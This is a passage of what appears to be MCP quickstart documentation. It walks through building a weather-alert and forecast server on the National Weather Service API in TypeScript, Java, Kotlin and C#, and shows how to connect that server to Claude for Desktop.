true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\"]\n}\n```\n\nNow let's dive into building your server.\n\n## Building your server\n\n### Importing packages and setting up the instance\n\nAdd these to the top of your `src/index.ts`:\n\n```typescript\nimport { McpServer } from \"@modelcontextprotocol/sdk/server/mcp.js\";\nimport { StdioServerTransport } from \"@modelcontextprotocol/sdk/server/stdio.js\";\nimport { z } from \"zod\";\n\nconst NWS_API_BASE = \"https://api.weather.gov\";\nconst USER_AGENT = \"weather-app/1.0\";\n\n// Create server instance\nconst server = new McpServer({\n  name: \"weather\",\n  version: \"1.0.0\",\n});\n```\n\n### Helper functions\n\nNext, let's add our helper functions for querying and formatting the data from the National Weather Service API:\n\n```typescript\n// Helper function for making NWS API requests\nasync function makeNWSRequest<T>(url: string): Promise<T | null> {\n  const headers = {\n    \"User-Agent\": USER_AGENT,\n    Accept: \"application/geo+json\",\n  };\n\n  try {\n    const response = await fetch(url, { headers });\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    return (await response.json()) as T;\n  } catch (error) {\n    console.error(\"Error making NWS request:\", error);\n    return null;\n  }\n}\n\ninterface AlertFeature {\n  properties: {\n    event?: string;\n    areaDesc?: string;\n    severity?: string;\n    status?: string;\n    headline?: string;\n  };\n}\n\n// Format alert data\nfunction formatAlert(feature: AlertFeature): string {\n  const props = feature.properties;\n  return [\n    `Event: ${props.event || \"Unknown\"}`,\n    `Area: ${props.areaDesc || \"Unknown\"}`,\n    `Severity: ${props.severity || \"Unknown\"}`,\n    `Status: ${props.status || \"Unknown\"}`,\n    `Headline: ${props.headline || \"No headline\"}`,\n    \"---\",\n  ].join(\"\\n\");\n}\n\ninterface ForecastPeriod {\n  name?: string;\n  temperature?: number;\n  temperatureUnit?: string;\n  windSpeed?: string;\n  windDirection?: string;\n  shortForecast?: string;\n}\n\ninterface AlertsResponse {\n  features: AlertFeature[];\n}\n\ninterface PointsResponse {\n  properties: {\n    forecast?: string;\n  };\n}\n\ninterface ForecastResponse {\n  properties: {\n    periods: ForecastPeriod[];\n  };\n}\n```\n\n### Implementing tool execution\n\nThe tool execution handler is responsible for actually executing the logic of each tool. Let's add it:\n\n```typescript\n// Register weather tools\nserver.tool(\n  \"get_alerts\",\n  \"Get weather alerts for a state\",\n  {\n    state: z.string().length(2).describe(\"Two-letter state code (e.g. CA, NY)\"),\n  },\n  async ({ state }) => {\n    const stateCode = state.toUpperCase();\n    const alertsUrl = `${NWS_API_BASE}/alerts?area=${stateCode}`;\n    const alertsData = await makeNWSRequest<AlertsResponse>(alertsUrl);\n\n    if (!alertsData) {\n      return {\n        content: [\n          {\n            type: \"text\",\n            text: \"Failed to retrieve alerts data\",\n          },\n        ],\n      };\n    }\n\n    const features = alertsData.features || [];\n    if (features.length === 0) {\n      return {\n        content: [\n          {\n            type: \"text\",\n            text: `No active alerts for ${stateCode}`,\n          },\n        ],\n      };\n    }\n\n    const formattedAlerts = features.map(formatAlert);\n    const alertsText = `Active alerts for ${stateCode}:\\n\\n${formattedAlerts.join(\"\\n\")}`;\n\n    return {\n      content: [\n        {\n          type: \"text\",\n          text: alertsText,\n        },\n      ],\n    };\n  },\n);\n\nserver.tool(\n  \"get_forecast\",\n  \"Get weather forecast for a location\",\n  {\n    latitude: z.number().min(-90).max(90).describe(\"Latitude of the location\"),\n    longitude: z\n      .number()\n      .min(-180)\n      .max(180)\n      .describe(\"Longitude of the location\"),\n  },\n  async ({ latitude, longitude }) => {\n    // Get grid point data\n    const pointsUrl = `${NWS_API_BASE}/points/${latitude.toFixed(4)},${longitude.toFixed(4)}`;\n    const pointsData = await makeNWSRequest<PointsResponse>(pointsUrl);\n\n    if (!pointsData) {\n      return {\n        content: [\n          {\n            type: \"text\",\n            text: `Failed to retrieve grid point data for coordinates: ${latitude}, ${longitude}. This location may not be supported by the NWS API (only US locations are supported).`,\n          },\n        ],\n      };\n    }\n\n    const forecastUrl = pointsData.properties?.forecast;\n    if (!forecastUrl) {\n      return {\n        content: [\n          {\n            type: \"text\",\n            text: \"Failed to get forecast URL from grid point data\",\n          },\n        ],\n      };\n    }\n\n    // Get forecast data\n    const forecastData = await makeNWSRequest<ForecastResponse>(forecastUrl);\n    if (!forecastData) {\n      return {\n        content: [\n          {\n            type: \"text\",\n            text: \"Failed to retrieve forecast data\",\n          },\n        ],\n      };\n    }\n\n    const periods = forecastData.properties?.periods || [];\n    if (periods.length === 0) {\n      return {\n        content: [\n          {\n            type: \"text\",\n            text: \"No forecast periods available\",\n          },\n        ],\n      };\n    }\n\n    // Format forecast periods\n    const formattedForecast = periods.map((period: ForecastPeriod) =>\n      [\n        `${period.name || \"Unknown\"}:`,\n        `Temperature: ${period.temperature || \"Unknown\"}°${period.temperatureUnit || \"F\"}`,\n        `Wind: ${period.windSpeed || \"Unknown\"} ${period.windDirection || \"\"}`,\n        `${period.shortForecast || \"No forecast available\"}`,\n        \"---\",\n      ].join(\"\\n\"),\n    );\n\n    const forecastText = `Forecast for ${latitude}, ${longitude}:\\n\\n${formattedForecast.join(\"\\n\")}`;\n\n    return {\n      content: [\n        {\n          type: \"text\",\n          text: forecastText,\n        },\n      ],\n    };\n  },\n);\n```\n\n### Running the server\n\nFinally, implement the main function to run the server:\n\n```typescript\nasync function main() {\n  const transport = new StdioServerTransport();\n  await server.connect(transport);\n  console.error(\"Weather MCP Server running on stdio\");\n}\n\nmain().catch((error) => {\n  console.error(\"Fatal error in main():\", error);\n  process.exit(1);\n});\n```\n\nMake sure to run `npm run build` to build your server! This is a very important step in getting your server to connect.\n\nLet's now test your server from an existing MCP host, Claude for Desktop.\n\n## Testing your server with Claude for Desktop\n\n<Note>\n\nClaude for Desktop is not yet available on Linux. Linux users can proceed to the [Building a client](/docs/develop/build-client) tutorial to build an MCP client that connects to the server we just built.\n\n</Note>\n\nFirst, make sure you have Claude for Desktop installed. [You can install the latest version\nhere.](https://claude.ai/download) If you already have Claude for Desktop, **make sure it's updated to the latest version.**\n\nWe'll need to configure Claude for Desktop for whichever MCP servers you want to use. To do this, open your Claude for Desktop App configuration at `~/Library/Application Support/Claude/claude_desktop_config.json` in a text editor. Make sure to create the file if it doesn't exist.\n\nFor example, if you have [VS Code](https://code.visualstudio.com/) installed:\n\n<CodeGroup>\n\n```bash macOS/Linux\ncode ~/Library/Application\\ Support/Claude/claude_desktop_config.json\n```\n\n```powershell Windows\ncode $env:AppData\\Claude\\claude_desktop_config.json\n```\n\n</CodeGroup>\n\nYou'll then add your servers in the `mcpServers` key. The MCP UI elements will only show up in Claude for Desktop if at least one server is properly configured.\n\nIn this case, we'll add our single weather server like so:\n\n<CodeGroup>\n\n```json macOS/Linux\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"node\",\n      \"args\": [\"/ABSOLUTE/PATH/TO/PARENT/FOLDER/weather/build/index.js\"]\n    }\n  }\n}\n```\n\n```json Windows\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"node\",\n      \"args\": [\"C:\\\\PATH\\\\TO\\\\PARENT\\\\FOLDER\\\\weather\\\\build\\\\index.js\"]\n    }\n  }\n}\n```\n\n</CodeGroup>\n\nThis tells Claude for Desktop:\n\n1. There's an MCP server named \"weather\"\n2. Launch it by running `node /ABSOLUTE/PATH/TO/PARENT/FOLDER/weather/build/index.js`\n\nSave the file, and restart **Claude for Desktop**.\n\n</Tab>\n<Tab title='Java'>\n\n<Note>\n\nThis is a quickstart demo based on Spring AI MCP auto-configuration and boot starters.\nTo learn how to create sync and async MCP Servers, manually, consult the [Java SDK Server](/sdk/java/mcp-server) documentation.\n\n</Note>\n\nLet's get started with building our weather server!\n[You can find the complete code for what we'll be building here.](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/weather/starter-stdio-server)\n\nFor more information, see the [MCP Server Boot Starter](https://docs.spring.io/spring-ai/reference/api/mcp/mcp-server-boot-starter-docs.html) reference documentation.\nFor manual MCP Server implementation, refer to the [MCP Server Java SDK documentation](/sdk/java/mcp-server).\n\n### Logging in MCP Servers\n\nWhen implementing MCP servers, be careful about how you handle logging:\n\n**For STDIO-based servers:** Never write to standard output (stdout). This includes:\n\n- `print()` statements in Python\n- `console.log()` in JavaScript\n- `fmt.Println()` in Go\n- Similar stdout functions in other languages\n\nWriting to stdout will corrupt the JSON-RPC messages and break your server.\n\n**For HTTP-based servers:** Standard output logging is fine since it doesn't interfere with HTTP responses.\n\n### Best Practices\n\n1. Use a logging library that writes to stderr or files.\n2. Ensure any configured logging library will not write to STDOUT\n\n### System requirements\n\n- Java 17 or higher installed.\n- [Spring Boot 3.3.x](https://docs.spring.io/spring-boot/installing.html) or higher\n\n### Set up your environment\n\nUse the [Spring Initializer](https://start.spring.io/) to bootstrap the project.\n\nYou will need to add the following dependencies:\n\n<CodeGroup>\n\n```xml Maven\n<dependencies>\n      <dependency>\n          <groupId>org.springframework.ai</groupId>\n          <artifactId>spring-ai-starter-mcp-server</artifactId>\n      </dependency>\n\n      <dependency>\n          <groupId>org.springframework</groupId>\n          <artifactId>spring-web</artifactId>\n      </dependency>\n</dependencies>\n```\n\n```groovy Gradle\ndependencies {\n  implementation platform(\"org.springframework.ai:spring-ai-starter-mcp-server\")\n  implementation platform(\"org.springframework:spring-web\")\n}\n```\n\n</CodeGroup>\n\nThen configure your application by setting the application properties:\n\n<CodeGroup>\n\n```bash application.properties\nspring.main.bannerMode=off\nlogging.pattern.console=\n```\n\n```yaml application.yml\nlogging:\n  pattern:\n    console:\nspring:\n  main:\n    banner-mode: off\n```\n\n</CodeGroup>\n\nThe [Server Configuration Properties](https://docs.spring.io/spring-ai/reference/api/mcp/mcp-server-boot-starter-docs.html#_configuration_properties) documents all available properties.\n\nNow let's dive into building your server.\n\n## Building your server\n\n### Weather Service\n\nLet's implement a [WeatherService.java](https://github.com/spring-projects/spring-ai-examples/blob/main/model-context-protocol/weather/starter-stdio-server/src/main/java/org/springframework/ai/mcp/sample/server/WeatherService.java) that uses a REST client to query the data from the National Weather Service API:\n\n```java\n@Service\npublic class WeatherService {\n\n\tprivate final RestClient restClient;\n\n\tpublic WeatherService() {\n\t\tthis.restClient = RestClient.builder()\n\t\t\t.baseUrl(\"https://api.weather.gov\")\n\t\t\t.defaultHeader(\"Accept\", \"application/geo+json\")\n\t\t\t.defaultHeader(\"User-Agent\", \"WeatherApiClient/1.0 (your@email.com)\")\n\t\t\t.build();\n\t}\n\n  @Tool(description = \"Get weather forecast for a specific latitude/longitude\")\n  public String getWeatherForecastByLocation(\n      double latitude,   // Latitude coordinate\n      double longitude   // Longitude coordinate\n  ) {\n      // Returns detailed forecast including:\n      // - Temperature and unit\n      // - Wind speed and direction\n      // - Detailed forecast description\n  }\n\n  @Tool(description = \"Get weather alerts for a US state\")\n  public String getAlerts(\n      @ToolParam(description = \"Two-letter US state code (e.g. CA, NY)\") String state\n  ) {\n      // Returns active alerts including:\n      // - Event type\n      // - Affected area\n      // - Severity\n      // - Description\n      // - Safety instructions\n  }\n\n  // ......\n}\n```\n\nThe `@Service` annotation with auto-register the service in your application context.\nThe Spring AI `@Tool` annotation, making it easy to create and maintain MCP tools.\n\nThe auto-configuration will automatically register these tools with the MCP server.\n\n### Create your Boot Application\n\n```java\n@SpringBootApplication\npublic class McpServerApplication {\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(McpServerApplication.class, args);\n\t}\n\n\t@Bean\n\tpublic ToolCallbackProvider weatherTools(WeatherService weatherService) {\n\t\treturn  MethodToolCallbackProvider.builder().toolObjects(weatherService).build();\n\t}\n}\n```\n\nUses the `MethodToolCallbackProvider` utils to convert the `@Tools` into actionable callbacks used by the MCP server.\n\n### Running the server\n\nFinally, let's build the server:\n\n```bash\n./mvnw clean install\n```\n\nThis will generate an `mcp-weather-stdio-server-0.0.1-SNAPSHOT.jar` file within the `target` folder.\n\nLet's now test your server from an existing MCP host, Claude for Desktop.\n\n## Testing your server with Claude for Desktop\n\n<Note>\n\nClaude for Desktop is not yet available on Linux.\n\n</Note>\n\nFirst, make sure you have Claude for Desktop installed.\n[You can install the latest version here.](https://claude.ai/download) If you already have Claude for Desktop, **make sure it's updated to the latest version.**\n\nWe'll need to configure Claude for Desktop for whichever MCP servers you want to use.\nTo do this, open your Claude for Desktop App configuration at `~/Library/Application Support/Claude/claude_desktop_config.json` in a text editor.\nMake sure to create the file if it doesn't exist.\n\nFor example, if you have [VS Code](https://code.visualstudio.com/) installed:\n\n<CodeGroup>\n\n```bash macOS/Linux\ncode ~/Library/Application\\ Support/Claude/claude_desktop_config.json\n```\n\n```powershell Windows\ncode $env:AppData\\Claude\\claude_desktop_config.json\n```\n\n</CodeGroup>\n\nYou'll then add your servers in the `mcpServers` key.\nThe MCP UI elements will only show up in Claude for Desktop if at least one server is properly configured.\n\nIn this case, we'll add our single weather server like so:\n\n<CodeGroup>\n\n```json macOS/Linux\n{\n  \"mcpServers\": {\n    \"spring-ai-mcp-weather\": {\n      \"command\": \"java\",\n      \"args\": [\n        \"-Dspring.ai.mcp.server.stdio=true\",\n        \"-jar\",\n        \"/ABSOLUTE/PATH/TO/PARENT/FOLDER/mcp-weather-stdio-server-0.0.1-SNAPSHOT.jar\"\n      ]\n    }\n  }\n}\n```\n\n```json Windows\n{\n  \"mcpServers\": {\n    \"spring-ai-mcp-weather\": {\n      \"command\": \"java\",\n      \"args\": [\n        \"-Dspring.ai.mcp.server.transport=STDIO\",\n        \"-jar\",\n        \"C:\\\\ABSOLUTE\\\\PATH\\\\TO\\\\PARENT\\\\FOLDER\\\\weather\\\\mcp-weather-stdio-server-0.0.1-SNAPSHOT.jar\"\n      ]\n    }\n  }\n}\n```\n\n</CodeGroup>\n\n<Note>\n\nMake sure you pass in the absolute path to your server.\n\n</Note>\n\nThis tells Claude for Desktop:\n\n1. There's an MCP server named \"my-weather-server\"\n2. To launch it by running `java -jar /ABSOLUTE/PATH/TO/PARENT/FOLDER/mcp-weather-stdio-server-0.0.1-SNAPSHOT.jar`\n\nSave the file, and restart **Claude for Desktop**.\n\n## Testing your server with Java client\n\n### Create an MCP Client manually\n\nUse the `McpClient` to connect to the server:\n\n```java\nvar stdioParams = ServerParameters.builder(\"java\")\n  .args(\"-jar\", \"/ABSOLUTE/PATH/TO/PARENT/FOLDER/mcp-weather-stdio-server-0.0.1-SNAPSHOT.jar\")\n  .build();\n\nvar stdioTransport = new StdioClientTransport(stdioParams);\n\nvar mcpClient = McpClient.sync(stdioTransport).build();\n\nmcpClient.initialize();\n\nListToolsResult toolsList = mcpClient.listTools();\n\nCallToolResult weather = mcpClient.callTool(\n  new CallToolRequest(\"getWeatherForecastByLocation\",\n      Map.of(\"latitude\", \"47.6062\", \"longitude\", \"-122.3321\")));\n\nCallToolResult alert = mcpClient.callTool(\n  new CallToolRequest(\"getAlerts\", Map.of(\"state\", \"NY\")));\n\nmcpClient.closeGracefully();\n```\n\n### Use MCP Client Boot Starter\n\nCreate a new boot starter application using the `spring-ai-starter-mcp-client` dependency:\n\n```xml\n<dependency>\n    <groupId>org.springframework.ai</groupId>\n    <artifactId>spring-ai-starter-mcp-client</artifactId>\n</dependency>\n```\n\nand set the `spring.ai.mcp.client.stdio.servers-configuration` property to point to your `claude_desktop_config.json`.\nYou can reuse the existing Anthropic Desktop configuration:\n\n```properties\nspring.ai.mcp.client.stdio.servers-configuration=file:PATH/TO/claude_desktop_config.json\n```\n\nWhen you start your client application, the auto-configuration will create, automatically MCP clients from the claude_desktop_config.json.\n\nFor more information, see the [MCP Client Boot Starters](https://docs.spring.io/spring-ai/reference/api/mcp/mcp-server-boot-client-docs.html) reference documentation.\n\n## More Java MCP Server examples\n\nThe [starter-webflux-server](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/weather/starter-webflux-server) demonstrates how to create an MCP server using SSE transport.\nIt showcases how to define and register MCP Tools, Resources, and Prompts, using the Spring Boot's auto-configuration capabilities.\n\n</Tab>\n\n<Tab title='Kotlin'>\n\nLet's get started with building our weather server! [You can find the complete code for what we'll be building here.](https://github.com/modelcontextprotocol/kotlin-sdk/tree/main/samples/weather-stdio-server)\n\n### Prerequisite knowledge\n\nThis quickstart assumes you have familiarity with:\n\n- Kotlin\n- LLMs like Claude\n\n### System requirements\n\n- Java 17 or higher installed.\n\n### Set up your environment\n\nFirst, let's install `java` and `gradle` if you haven't already.\nYou can download `java` from [official Oracle JDK website](https://www.oracle.com/java/technologies/downloads/).\nVerify your `java` installation:\n\n```bash\njava --version\n```\n\nNow, let's create and set up your project:\n\n<CodeGroup>\n\n```bash macOS/Linux\n# Create a new directory for our project\nmkdir weather\ncd weather\n\n# Initialize a new kotlin project\ngradle init\n```\n\n```powershell Windows\n# Create a new directory for our project\nmd weather\ncd weather\n\n# Initialize a new kotlin project\ngradle

language, and **Java 17** as the Java version.\n\nAlternatively, you can create a Kotlin application using the [IntelliJ IDEA project wizard](https://kotlinlang.org/docs/jvm-get-started.html).\n\nAfter creating the project, add the following dependencies:\n\n<CodeGroup>\n\n```kotlin build.gradle.kts\nval mcpVersion = \"0.4.0\"\nval

System.`in`.asInput(),\n        System.out.asSink().buffered()\n    )\n\n    runBlocking {\n        server.connect(transport)\n        val done = Job()\n        server.onClose {\n            done.complete()\n        }\n        done.join()\n    }\n}\n```\n\n### Weather API helper functions\n\nNext, let's add functions and data classes for querying and converting responses from the National Weather Service API:\n\n```kotlin\n// Extension function to fetch forecast information for given latitude and longitude\nsuspend fun HttpClient.getForecast(latitude: Double, longitude: Double): List<String> {\n    val points = this.get(\"/points/$latitude,$longitude\").body<Points>()\n    val forecast = this.get(points.properties.forecast).body<Forecast>()\n    return forecast.properties.periods.map { period ->\n        \"\"\"\n            ${period.name}:\n            Temperature: ${period.temperature} ${period.temperatureUnit}\n            Wind: ${period.windSpeed} ${period.windDirection}\n            Forecast: ${period.detailedForecast}\n        \"\"\".trimIndent()\n    }\n}\n\n// Extension function to fetch weather alerts for a given state\nsuspend fun HttpClient.getAlerts(state: String): List<String> {\n    val alerts = this.get(\"/alerts/active/area/$state\").body<Alert>()\n    return alerts.features.map { feature ->\n        \"\"\"\n            Event: ${feature.properties.event}\n            Area: ${feature.properties.areaDesc}\n            Severity: ${feature.properties.severity}\n            Description: ${feature.properties.description}\n            Instruction: ${feature.properties.instruction}\n        \"\"\".trimIndent()\n    }\n}\n\n@Serializable\ndata class Points(\n    val properties: Properties\n) {\n    @Serializable\n    data class Properties(val forecast: String)\n}\n\n@Serializable\ndata class Forecast(\n    val properties: Properties\n) {\n    @Serializable\n    data class Properties(val periods: List<Period>)\n\n    @Serializable\n    data class Period(\n        val number: Int, val name: String, val startTime: String, val endTime: String,\n        val isDaytime: Boolean, val temperature: Int, val temperatureUnit: String,\n        val temperatureTrend: String, val probabilityOfPrecipitation: JsonObject,\n        val windSpeed: String, val windDirection: String,\n        val shortForecast: String, val detailedForecast: String,\n    )\n}\n\n@Serializable\ndata class Alert(\n    val features: List<Feature>\n) {\n    @Serializable\n    data class Feature(\n        val properties: Properties\n    )\n\n    @Serializable\n    data class Properties(\n        val event: String, val areaDesc: String, val severity: String,\n        val description: String, val instruction: String?,\n    )\n}\n```\n\n### Implementing tool execution\n\nThe tool execution handler is responsible for actually executing the logic of each tool. Let's add it:\n\n```kotlin\n// Create an HTTP client with a default request configuration and JSON content negotiation\nval httpClient = HttpClient {\n    defaultRequest {\n        url(\"https://api.weather.gov\")\n        headers {\n            append(\"Accept\", \"application/geo+json\")\n            append(\"User-Agent\", \"WeatherApiClient/1.0\")\n        }\n        contentType(ContentType.Application.Json)\n    }\n    // Install content negotiation plugin for JSON serialization/deserialization\n    install(ContentNegotiation) { json(Json { ignoreUnknownKeys = true }) }\n}\n\n// Register a tool to fetch weather alerts by state\nserver.addTool(\n    name = \"get_alerts\",\n    description = \"\"\"\n        Get weather alerts for a US state. Input is Two-letter US state code (e.g. CA, NY)\n    \"\"\".trimIndent(),\n    inputSchema = Tool.Input(\n        properties = buildJsonObject {\n            putJsonObject(\"state\") {\n                put(\"type\", \"string\")\n                put(\"description\", \"Two-letter US state code (e.g. CA, NY)\")\n            }\n        },\n        required = listOf(\"state\")\n    )\n) { request ->\n    val state = request.arguments[\"state\"]?.jsonPrimitive?.content\n    if (state == null) {\n        return@addTool CallToolResult(\n            content = listOf(TextContent(\"The 'state' parameter is required.\"))\n        )\n    }\n\n    val alerts = httpClient.getAlerts(state)\n\n    CallToolResult(content = alerts.map { TextContent(it) })\n}\n\n// Register a tool to fetch weather forecast by latitude and longitude\nserver.addTool(\n    name = \"get_forecast\",\n    description = \"\"\"\n        Get weather forecast for a specific latitude/longitude\n    \"\"\".trimIndent(),\n    inputSchema = Tool.Input(\n        properties = buildJsonObject {\n            putJsonObject(\"latitude\") { put(\"type\", \"number\") }\n            putJsonObject(\"longitude\") { put(\"type\", \"number\") }\n        },\n        required = listOf(\"latitude\", \"longitude\")\n    )\n) { request ->\n    val latitude = request.arguments[\"latitude\"]?.jsonPrimitive?.doubleOrNull\n    val longitude = request.arguments[\"longitude\"]?.jsonPrimitive?.doubleOrNull\n    if (latitude == null || longitude == null) {\n        return@addTool CallToolResult(\n            content = listOf(TextContent(\"The 'latitude' and 'longitude' parameters are required.\"))\n        )\n    }\n\n    val forecast = httpClient.getForecast(latitude, longitude)\n\n    CallToolResult(content = forecast.map { TextContent(it) })\n}\n```\n\n### Running the server\n\nFinally, implement the main function to run the server:\n\n```kotlin\nfun main() = `run mcp server`()\n```\n\nMake sure to run `./gradlew build` to build your server. This is a very important step in getting your server to connect.\n\nLet's now test your server from an existing MCP host, Claude for Desktop.\n\n## Testing your server with Claude for Desktop\n\n<Note>\n\nClaude for Desktop is not yet available on Linux. Linux users can proceed to the [Building a client](/docs/develop/build-client) tutorial to build an MCP client that connects to the server we just built.\n\n</Note>\n\nFirst, make sure you have Claude for Desktop installed. [You can install the latest version\nhere.](https://claude.ai/download) If you already have Claude for Desktop, **make sure it's updated to the latest version.**\n\nWe'll need to configure Claude for Desktop for whichever MCP servers you want to use.\nTo do this, open your Claude for Desktop App configuration at `~/Library/Application Support/Claude/claude_desktop_config.json` in a text editor.\nMake sure to create the file if it doesn't exist.\n\nFor example, if you have [VS Code](https://code.visualstudio.com/) installed:\n\n<CodeGroup>\n\n```bash macOS/Linux\ncode ~/Library/Application\\ Support/Claude/claude_desktop_config.json\n```\n\n```powershell Windows\ncode $env:AppData\\Claude\\claude_desktop_config.json\n```\n\n</CodeGroup>\n\nYou'll then add your servers in the `mcpServers` key.\nThe MCP UI elements will only show up in Claude for Desktop if at least one server is properly configured.\n\nIn this case, we'll add our single weather server like so:\n\n<CodeGroup>\n\n```json macOS/Linux\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"java\",\n      \"args\": [\n        \"-jar\",\n        \"/ABSOLUTE/PATH/TO/PARENT/FOLDER/weather/build/libs/weather-0.1.0-all.jar\"\n      ]\n    }\n  }\n}\n```\n\n```json Windows\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"java\",\n      \"args\": [\n        \"-jar\",\n        \"C:\\\\PATH\\\\TO\\\\PARENT\\\\FOLDER\\\\weather\\\\build\\\\libs\\\\weather-0.1.0-all.jar\"\n      ]\n    }\n  }\n}\n```\n\n</CodeGroup>\n\nThis tells Claude for Desktop:\n\n1. There's an MCP server named \"weather\"\n2. Launch it by running `java -jar /ABSOLUTE/PATH/TO/PARENT/FOLDER/weather/build/libs/weather-0.1.0-all.jar`\n\nSave the file, and restart **Claude for Desktop**.\n\n</Tab>\n\n<Tab title='C#'>\n\nLet's get started with building our weather server! [You can find the complete code for what we'll be building here.](https://github.com/modelcontextprotocol/csharp-sdk/tree/main/samples/QuickstartWeatherServer)\n\n### Prerequisite knowledge\n\nThis quickstart assumes you have familiarity with:\n\n- C#\n- LLMs like Claude\n- .NET 8 or higher\n\n### Logging in MCP Servers\n\nWhen implementing MCP servers, be careful about how you handle logging:\n\n**For STDIO-based servers:** Never write to standard output (stdout). This includes:\n\n- `print()` statements in Python\n- `console.log()` in JavaScript\n- `fmt.Println()` in Go\n- Similar stdout functions in other languages\n\nWriting to stdout will corrupt the JSON-RPC messages and break your server.\n\n**For HTTP-based servers:** Standard output logging is fine since it doesn't interfere with HTTP responses.\n\n### Best Practices\n\n1. Use a logging library that writes to stderr or files\n\n### System requirements\n\n- [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0) or higher installed.\n\n### Set up your environment\n\nFirst, let's install `dotnet` if you haven't already. You can download `dotnet` from [official Microsoft .NET website](https://dotnet.microsoft.com/download/). Verify your `dotnet` installation:\n\n```bash\ndotnet --version\n```\n\nNow, let's create and set up your project:\n\n<CodeGroup>\n\n```bash macOS/Linux\n# Create a new directory for our project\nmkdir weather\ncd weather\n# Initialize a new C# project\ndotnet new console\n```\n\n```powershell Windows\n# Create a new directory for our project\nmkdir weather\ncd weather\n# Initialize a new C# project\ndotnet new console\n```\n\n</CodeGroup>\nAfter running `dotnet new console`, you will be presented with a new C# project.\nYou can open the project in your favorite IDE, such as [Visual Studio](https://visualstudio.microsoft.com/) or [Rider](https://www.jetbrains.com/rider/).\nAlternatively, you can create a C# application using the [Visual Studio project wizard](https://learn.microsoft.com/en-us/visualstudio/get-started/csharp/tutorial-console?view=vs-2022).\nAfter creating the project, add NuGet package for the Model Context Protocol SDK and hosting:\n\n```bash\n# Add the Model Context Protocol SDK NuGet package\ndotnet add package ModelContextProtocol --prerelease\n# Add the .NET Hosting NuGet package\ndotnet add package Microsoft.Extensions.Hosting\n```\n\nNow let’s dive into building your server.\n\n## Building your server\n\nOpen the `Program.cs` file in your project and replace its contents with the following code:\n\n```csharp\nusing Microsoft.Extensions.DependencyInjection;\nusing Microsoft.Extensions.Hosting;\nusing ModelContextProtocol;\nusing System.Net.Http.Headers;\n\nvar builder = Host.CreateEmptyApplicationBuilder(settings: null);\n\nbuilder.Services.AddMcpServer()\n    .WithStdioServerTransport()\n    .WithToolsFromAssembly();\n\nbuilder.Services.AddSingleton(_ =>\n{\n    var client = new HttpClient() { BaseAddress = new Uri(\"https://api.weather.gov\") };\n    client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(\"weather-tool\", \"1.0\"));\n    return client;\n});\n\nvar app = builder.Build();\n\nawait app.RunAsync();\n```\n\n<Note>\n\nWhen creating the `ApplicationHostBuilder`, ensure you use `CreateEmptyApplicationBuilder` instead of `CreateDefaultBuilder`. This ensures that the server does not write any additional messages to the console. This is only necessary for servers using STDIO transport.\n\n</Note>\n\nThis code sets up a basic console application that uses the Model Context Protocol SDK to create an MCP server with standard I/O transport.\n\n### Weather API helper functions\n\nCreate an extension class for `HttpClient` which helps simplify JSON request handling:\n\n```csharp\nusing System.Text.Json;\n\ninternal static class HttpClientExt\n{\n    public static async Task<JsonDocument> ReadJsonDocumentAsync(this HttpClient client, string requestUri)\n    {\n        using var response = await client.GetAsync(requestUri);\n        response.EnsureSuccessStatusCode();\n        return await JsonDocument.ParseAsync(await response.Content.ReadAsStreamAsync());\n    }\n}\n```\n\nNext, define a class with the tool execution handlers for querying and converting responses from the National Weather Service API:\n\n```csharp\nusing ModelContextProtocol.Server;\nusing System.ComponentModel;\nusing System.Globalization;\nusing System.Text.Json;\n\nnamespace QuickstartWeatherServer.Tools;\n\n[McpServerToolType]\npublic static class WeatherTools\n{\n    [McpServerTool, Description(\"Get weather alerts for a US state code.\")]\n    public static async Task<string> GetAlerts(\n        HttpClient client,\n        [Description(\"The US state code to get alerts for.\")] string state)\n    {\n        using var jsonDocument = await client.ReadJsonDocumentAsync($\"/alerts/active/area/{state}\");\n        var jsonElement = jsonDocument.RootElement;\n        var alerts = jsonElement.GetProperty(\"features\").EnumerateArray();\n\n        if (!alerts.Any())\n        {\n            return \"No active alerts for this state.\";\n        }\n\n        return string.Join(\"\\n--\\n\", alerts.Select(alert =>\n        {\n            JsonElement properties = alert.GetProperty(\"properties\");\n            return $\"\"\"\n                    Event: {properties.GetProperty(\"event\").GetString()}\n                    Area: {properties.GetProperty(\"areaDesc\").GetString()}\n                    Severity: {properties.GetProperty(\"severity\").GetString()}\n                    Description: {properties.GetProperty(\"description\").GetString()}\n                    Instruction: {properties.GetProperty(\"instruction\").GetString()}\n                    \"\"\";\n        }));\n    }\n\n    [McpServerTool, Description(\"Get weather forecast for a location.\")]\n    public static async Task<string> GetForecast(\n        HttpClient client,\n        [Description(\"Latitude of the location.\")] double latitude,\n        [Description(\"Longitude of the location.\")] double longitude)\n    {\n        var pointUrl = string.Create(CultureInfo.InvariantCulture, $\"/points/{latitude},{longitude}\");\n        using var jsonDocument = await client.ReadJsonDocumentAsync(pointUrl);\n        var forecastUrl = jsonDocument.RootElement.GetProperty(\"properties\").GetProperty(\"forecast\").GetString()\n            ?? throw new Exception($\"No forecast URL provided by {client.BaseAddress}points/{latitude},{longitude}\");\n\n        using var forecastDocument = await client.ReadJsonDocumentAsync(forecastUrl);\n        var periods = forecastDocument.RootElement.GetProperty(\"properties\").GetProperty(\"periods\").EnumerateArray();\n\n        return string.Join(\"\\n---\\n\", periods.Select(period => $\"\"\"\n                {period.GetProperty(\"name\").GetString()}\n                Temperature: {period.GetProperty(\"temperature\").GetInt32()}°F\n                Wind: {period.GetProperty(\"windSpeed\").GetString()} {period.GetProperty(\"windDirection\").GetString()}\n                Forecast: {period.GetProperty(\"detailedForecast\").GetString()}\n                \"\"\"));\n    }\n}\n```\n\n### Running the server\n\nFinally, run the server using the following command:\n\n```bash\ndotnet run\n```\n\nThis will start the server and listen for incoming requests on standard input/output.\n\n## Testing your server with Claude for 